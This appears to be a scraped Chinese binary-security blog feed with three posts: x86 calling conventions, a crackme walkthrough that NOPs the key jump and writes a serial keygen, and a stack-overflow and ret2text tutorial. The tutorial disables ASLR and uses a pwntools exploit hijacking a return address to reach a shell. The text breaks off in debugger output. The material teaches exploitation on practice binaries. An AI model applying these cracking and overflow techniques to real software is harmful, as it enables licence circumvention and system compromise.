x86处理器ABI规范中规定，所有传递给被调函数的参数都通过堆栈来完成，其压栈顺序是以函数参数从右到左的顺序。当向被调函数传递参数时，所有参数最后形成一个数组。由于采用从右到左的压栈顺序，数组中参数的顺序(下标0N-1)与函数参数声明顺序(Para1N)一致。因此，在函数中若知道第一个参数地址和各参数占用字节数，就可通过访问数组的方式去访问每个参数。 5.3.1 整型和指针参数的传递 整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同(均为四字节)。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。 5.3.2 浮点参数的传递 浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4字节。 5.3.3 结构体和联合体参数的传递 结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。 对于一些RISC处理器(如PowerPC)，其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，R3～R10共8个寄存器用于传递整型或指针参数，F1～F8共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的方式更低效。可见，PowerPC程序中，函数参数采用指向结构体的指针(而非结构体)并不能提高效率，不过通常这是良好的编程习惯。 5.4 x86函数返回值传递方法 函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时： 1) 若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。 2) 若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。 3) 若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回。 4) 若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。 注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。 5) 不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。 函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。 【扩展阅读】GCC**返回结构体和联合体** 通常GCC被配置为使用与目标系统一致的函数调用约定。这通过机器描述宏来实现。但是，在一些目标机上采用不同方式返回结构体和联合体的值。因此，使用PCC编译的返回这些类型的函数不能被使用GCC编译的代码调用，反之亦然。但这并未造成麻烦，因为很少有Unix库函数返回结构体或联合体。 GCC代码使用存放int或double类型返回值的寄存器来返回1、2、4或8个字节的结构体和联合体(GCC通常还将此类变量分配在寄存器中)。其它大小的结构体和联合体在返回时，将其存放在一个由调用者传递的地址中(通常在寄存器中)。 相比之下，PCC在大多目标机上返回任何大小的结构体和联合体时，都将数据复制到一个静态存储区域，再将该地址当作指针值返回。调用者必须将数据从那个内存区域复制到需要的地方。这比GCC使用的方法要慢，而且不可重入。 在一些目标机上(如RISC机器和80386)，标准的系统约定是将返回值的地址传给子程序。在这些机器上，当使用这种约定方法时，GCC被配置为与标准编译器兼容。这可能会对于1，2，4或8字节的结构体不兼容。 GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。 在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。 参考链接：https://www.cnblogs.com/clover-toeic/p/3756668.html","link":"/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%BA%8C/"},{"title":"crackme-系列之-crackme2","text":"首先打开进行查看 拖入od 中进行查看 定位关键语句 发现关键跳 跟踪将 走到je的时候发现跳转已实现 那么我们可以先双击寄存器窗口的Z右边的1 改为0 此时会变成跳转未实现 线条也由红变白由此可知je 为关键跳进行 nop 操作即可成功暴破 多选中几行，右键复制到可执行文件 所有修改 接着全部复制 分析过程https://www.52pojie.cn/thread-264394-1-1.html 由于我们在跳转附近没有发现任何类注册码的东西，所以，我们需要将这里块的内容F8跟踪一下，大概地看看那些地方可能和注册码相关。我们向上查找，在这段程序的开头(即找到最近的那个retn,下面开头一般是push ebp等)下断点： 00402310 &gt; \\55 push ebp // 程序段头 单步F8跟踪，将重要信息添加注释，特别是和Name/Serial相关的东西，分析后代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513600402403 . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;; MSVBVM50.__vbaHresultCheckObj00402409 &gt; 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]0040240F . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C]00402412 . 50 push eax ; //eax=111222,name00402413 . 8B1A mov ebx,dword ptr ds:[edx]00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;] ; MSVBVM50.__vbaLenBstr0040241B . 8BF8 mov edi,eax ; edi=60040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; ecx=1111222地址00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; // 乘法,edi*0x17CFB00402426 . 51 push ecx00402427 . 0F80 91020000 jo 004026BE0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; MSVBVM50.rtcAnsiValueBstr00402433 . 0FBFD0 movsx edx,ax00402436 . 03FA add edi,edx ; // edi=edi+edx（0x31）00402438 . 0F80 80020000 jo 004026BE0040243E . 57 push edi0040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ; MSVBVM50.__vbaStrI400402445 . 8BD0 mov edx,eax ; // eax=58523500402447 . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]0040244A . FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;] ; MSVBVM50.__vbaStrMove00402450 . 8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]00402456 . 50 push eax ; // 58523500402457 . 57 push edi ; // 0091B51C00402458 . FF93 A4000000 call dword ptr ds:[ebx+0xA4]0040245E . 85C0 test eax,eax ; // ==000402460 . 7D 12 jge short 0040247400402462 . 68 A4000000 push 0xA400402467 . 68 5C1B4000 push 00401B5C0040246C . 57 push edi0040246D . 50 push eax0040246E . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;; MSVBVM50.__vbaHresultCheckObj00402474 &gt; 8D45 E0 lea eax,dword ptr ss:[ebp-0x20]00402477 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C]0040247A . 50 push eax0040247B . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18]0040247E . 51 push ecx0040247F . 52 push edx00402480 . 6A 03 push 0x300402482 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;; MSVBVM50.__vbaFreeStrList00402488 . 83C4 10 add esp,0x100040248B . 8D45 D4 lea eax,dword ptr ss:[ebp-0x2C]0040248E . 8D4D D8 lea ecx,dword ptr ss:[ebp-0x28]00402491 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24]00402494 . 50 push eax00402495 . 51 push ecx00402496 . 52 push edx00402497 . 6A 03 push 0x300402499 . FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;; MSVBVM50.__vbaFreeObjList0040249F . 8B06 mov eax,dword ptr ds:[esi]004024A1 . 83C4 10 add esp,0x10004024A4 . 56 push esi004024A5 . FF90 04030000 call dword ptr ds:[eax+0x304]004024AB . 8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSet&gt;] ; MSVBVM50.__vbaObjSet004024B1 . 50 push eax004024B2 . 8D45 DC lea eax,dword ptr ss:[ebp-0x24]004024B5 . 50 push eax004024B6 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaObjSet&gt;004024B8 . 8BF8 mov edi,eax004024BA . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18]004024BD . 52 push edx004024BE . 57 push edi004024BF . 8B0F mov ecx,dword ptr ds:[edi]004024C1 . FF91 A0000000 call dword ptr ds:[ecx+0xA0]004024C7 . 85C0 test eax,eax ; eax=0,zf=1004024C9 . 7D 12 jge short 004024DD004024CB . 68 A0000000 push 0xA0004024D0 . 68 5C1B4000 push 00401B5C004024D5 . 57 push edi004024D6 . 50 push eax004024D7 . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;; MSVBVM50.__vbaHresultCheckObj004024DD &gt; 56 push esi004024DE . FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]004024E4 . 50 push eax004024E5 . 8D45 D8 lea eax,dword ptr ss:[ebp-0x28]004024E8 . 50 push eax004024E9 . FFD3 call ebx004024EB . 8BF0 mov esi,eax004024ED . 8D55 E4 lea edx,dword ptr ss:[ebp-0x1C]004024F0 . 52 push edx004024F1 . 56 push esi004024F2 . 8B0E mov ecx,dword ptr ds:[esi]004024F4 . FF91 A0000000 call dword ptr ds:[ecx+0xA0]004024FA . 85C0 test eax,eax ; eax=0004024FC . 7D 12 jge short 00402510004024FE . 68 A0000000 push 0xA000402503 . 68 5C1B4000 push 00401B5C00402508 . 56 push esi00402509 . 50 push eax0040250A . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;; MSVBVM50.__vbaHresultCheckObj00402510 &gt; 8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; eax=333444400402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] ; ecx=58523500402516 . 8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ; MSVBVM50.__vbaStrCat0040251C . 50 push eax ; eax=33344440040251D . 68 701B4000 push 00401B70 ; UNICODE &quot;AKA-&quot;00402522 . 51 push ecx ; ecx=58523500402523 . FFD7 call edi ; &lt;&amp;MSVBVM50.__vbaStrCat&gt;00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;; MSVBVM50.__vbaStrMove0040252B . 8BD0 mov edx,eax ; edx=eax=AKA-5852350040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]00402530 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaStrMove&gt;00402532 . 50 push eax00402533 . FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;] ; MSVBVM50.__vbaStrCmp00402539 . 8BF0 mov esi,eax ; eax=-10040253B . 8D55 E0 lea edx,dword ptr ss:[ebp-0x20]0040253E . F7DE neg esi ; 取补00402540 . 8D45 E8 lea eax,dword ptr ss:[ebp-0x18]00402543 . 52 push edx00402544 . 1BF6 sbb esi,esi00402546 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C]00402549 . 50 push eax0040254A . 46 inc esi0040254B . 51 push ecx0040254C . 6A 03 push 0x30040254E . F7DE neg esi00402550 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;; MSVBVM50.__vbaFreeStrList00402556 . 83C4 10 add esp,0x1000402559 . 8D55 D8 lea edx,dword ptr ss:[ebp-0x28]0040255C . 8D45 DC lea eax,dword ptr ss:[ebp-0x24]0040255F . 52 push edx00402560 . 50 push eax00402561 . 6A 02 push 0x200402563 . FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;; MSVBVM50.__vbaFreeObjList00402569 . 83C4 0C add esp,0xC0040256C . B9 04000280 mov ecx,0x8002000400402571 . B8 0A000000 mov eax,0xA00402576 . 894D 9C mov dword ptr ss:[ebp-0x64],ecx00402579 . 66:85F6 test si,si ; esi=0,ZF=10040257C . 8945 94 mov dword ptr ss:[ebp-0x6C],eax0040257F . 894D AC mov dword ptr ss:[ebp-0x54],ecx00402582 . 8945 A4 mov dword ptr ss:[ebp-0x5C],eax00402585 . 894D BC mov dword ptr ss:[ebp-0x44],ecx00402588 . 8945 B4 mov dword ptr ss:[ebp-0x4C],eax0040258B 74 58 je short 004025E5 ; // 爆破关键跳，NOP0040258D . 68 801B4000 push 00401B80 ; UNICODE &quot;You Get It&quot;00402592 . 68 9C1B4000 push 00401B9C ; ASCII &quot;\\r&quot;00402597 . FFD7 call edi 其实代码很简单，经过一遍跟踪，基本都出来了，重点分析部分如下： 12345678910111213141500402412 . 50 push eax ; //eax=111222,name00402413 . 8B1A mov ebx,dword ptr ds:[edx]00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;] ; MSVBVM50.__vbaLenBstr0040241B . 8BF8 mov edi,eax ; edi=60040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; ecx=1111222地址00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; // 乘法,edi*0x17CFB00402426 . 51 push ecx00402427 . 0F80 91020000 jo 004026BE0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; MSVBVM50.rtcAnsiValueBstr00402433 . 0FBFD0 movsx edx,ax00402436 . 03FA add edi,edx ; // edi=edi+edx（0x31）00402438 . 0F80 80020000 jo 004026BE0040243E . 57 push edi0040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ; MSVBVM50.__vbaStrI400402445 . 8BD0 mov edx,eax ; // eax=585235 首先，eax为Name的地址，经过vbaLenBstr计算的长度赋值给edi,然后edi=edi*0x17CFB,接着edi=edi+edx,而edx为Name字符串第一个字符Ansi的值，最后进过vbaStrI4将edi的整数值转换为十进制字符串585235。 然后向下跟踪和字符串585235相关的东西： 123456789101112131400402510 &gt; 8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; eax=333444400402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C] ; ecx=58523500402516 . 8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ; MSVBVM50.__vbaStrCat0040251C . 50 push eax ; eax=33344440040251D . 68 701B4000 push 00401B70 ; UNICODE &quot;AKA-&quot;00402522 . 51 push ecx ; ecx=58523500402523 . FFD7 call edi ; &lt;&amp;MSVBVM50.__vbaStrCat&gt;00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;; MSVBVM50.__vbaStrMove0040252B . 8BD0 mov edx,eax ; edx=eax=AKA-5852350040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]00402530 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaStrMove&gt;00402532 . 50 push eax00402533 . FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;] ; MSVBVM50.__vbaStrCmp00402539 . 8BF0 mov esi,eax 这段代码中将585235通过vbaStrCat与”AKA-”连接到一起组成字符串”AKA-585235”,然后通过vbaStrCmp函数与我们的Serial比较结果，最后返回值放到eax中，通过返回值确定是否正确。将这里的分析与上一块合到一起，很容易就可以得出最终的注册码。 小结一下：先取出注册码的长度len, 然后取出注册码第一个字符的ANSI值cName, 让后计算len*0x17CFB+cName,将计算的值转换为10进制文本，前面加上”AKA-”组成最后的注册码。 C/CPP代码如下： 12345678910111213141516171819202122232425// CrackMe160.cpp : 定义控制台应用程序的入口点。// 002 #include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;#include &quot;iostream&quot; char buff[100] = {0};int _tmain(int argc, _TCHAR* argv[]){ printf(&quot;160CrackMe-002 Name/Serial\\r\\n\\r\\n&quot;); printf(&quot;Name:&quot;); gets_s(buff,100); int nLen = strlen(buff); if ( nLen &gt; 0 ) { int nRet = nLen * 0x17CFB; nRet += buff[0]; printf(&quot;AKA-%d\\r\\n&quot;,nRet); }else{ printf(&quot;Input error!\\r\\n&quot;); } system(&quot;pause&quot;); return 0;} Python： 1234567# author ol4threei = str(input())i_len = len(str(i))print i_leni_len = i_len * 0x17CFbflag = ord(i[0]) + i_lenprint &quot;AKA-&quot; + str(flag)","link":"/2020/12/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme2/"},{"title":"linux-stack-Overflow-1","text":"栈介绍基本栈介绍 栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。 高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，程序的栈是从进程地址空间的高地址向低地址增长的。 函数调用栈这里再给出另外一张寄存器的图 需要注意的是，32 位和 64 位程序有以下简单的区别 x86 函数参数在函数返回地址的上方 x64 System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。 内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。 栈溢出原理介绍 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是 程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。 基本示例最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，当然需要确保这个地址所在的段具有可执行权限。下面，我们举一个简单的例子： #include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() { puts(&quot;You Hava already controlled it.&quot;); }void vulnerable() { char s[12]; gets(s); puts(s); return;}int main(int argc, char **argv) { vulnerable(); return 0;} 这个程序的主要目的读取一个字符串，并将其输出。我们希望可以控制程序执行 success 函数。 我们利用如下命令对其进行编译 gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example stack_example.c: In function ‘vulnerable’:stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration] gets(s); ^/tmp/ccPU8rRA.o：在函数‘vulnerable’中：stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used. 可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出， 历史上，莫里斯蠕虫第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。 gcc 编译指令中，-m32 指的是生成 32 位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有--enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie。 编译成功后，可以使用 checksec 工具检查编译出的文件： checksec stack_example[*] '/home/ol4three/Desktop/stack_example' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 /proc/sys/kernel/randomize_va_space 来控制 ASLR 启动与否，具体的选项有 0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。 1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。 2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。 我们可以使用echo 0 &gt; /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。 为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。 确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到 int vulnerable(){ char s; // [esp+4h] [ebp-14h] gets(&amp;s); return puts(&amp;s);} 该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---&gt;+-----------------+ | | | | | | | | | | | |s,ebp-0x14--&gt;+-----------------+ 并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x08048456。 .text:08048456 success db 55h.text:08048457 ; ---------------------------------------------------------------------------.text:08048457 mov ebp, esp.text:08048459 push ebx.text:0804845A sub esp, 4.text:0804845D call near ptr __x86_get_pc_thunk_ax.text:08048462 add eax, 1B9Eh.text:08048467 sub esp, 0Ch.text:0804846A push 20697421h ; s.text:0804846F mov ebx, eax.text:08048471 call _puts.text:08048476 add esp, 10h.text:08048479 nop.text:0804847A mov ebx, [ebp-4].text:0804847D leave.text:0804847E retn.text:0804847E ; } // starts at 8048456 那么如果我们读取的字符串为 0x14*'a'+'bbbb'+success_addr 那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为 +-----------------+ | 0x0804843B | +-----------------+ | bbbb | ebp---&gt;+-----------------+ | | | | | | | | | | | |s,ebp-0x14--&gt;+-----------------+ 但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08048456 在内存中的形式是 \\x56\\x84\\x04\\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \\，x 等也算一个单独的字符。。所以我们需要想办法将 \\x56 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下： ##coding=utf8from pwn import *sh = process('./stack_example')success_addr = 0x08048456payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)print p32(success_addr)sh.sendline(payload)sh.interactive() 执行一波代码，可以得到 python exp.py[+] Starting local process './stack_example': pid 61936;\\x84\\x0[*] Switching to interactive modeaaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0You Hava already controlled it.[*] Got EOF while reading in interactive$ [*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)[*] Got EOF while sending in interactive 可以看到我们确实已经执行 success 函数。 小总结上面的示例其实也展示了栈溢出中比较重要的几个步骤。 寻找危险函数通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下 输入 gets，直接读取一行，忽略’\\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\\x00’停止 strcat，字符串拼接，遇到’\\x00’停止 bcopy 确定填充长度这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求 覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。 Basic ROP基本 ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 ret2text原理ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 例子其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。 点击下载: ret2text 首先，查看一下程序的保护机制 $ checksec ret2text[*] '/home/ol4three/Desktop/ret2text' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。 int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets(&amp;s); printf(&quot;Maybe I will tell you next time !&quot;); return 0;} 可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现 .text:080485FD secure db 55h.text:080485FE ; ---------------------------------------------------------------------------.text:080485FE mov ebp, esp.text:08048600 sub esp, 28h.text:08048603 mov dword ptr [esp], 0 ; timer.text:0804860A call _time.text:0804860F mov [esp], eax ; seed.text:08048612 call _srand.text:08048617 call _rand.text:0804861C mov [ebp-0Ch], eax.text:0804861F lea eax, [ebp-10h].text:08048622 mov [esp+4], eax.text:08048626 mov dword ptr [esp], offset unk_8048760.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp-10h].text:08048635 cmp eax, [ebp-0Ch].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system 在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0804863A，那么就可以得到系统的 shell 了。 下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。 .text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下 pwndbg&gt; b *0x080486aeBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.pwndbg&gt; rStarting program: /home/ol4three/Desktop/ret2textThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 ret2text.c: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────── EAX 0xffffd4dc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34 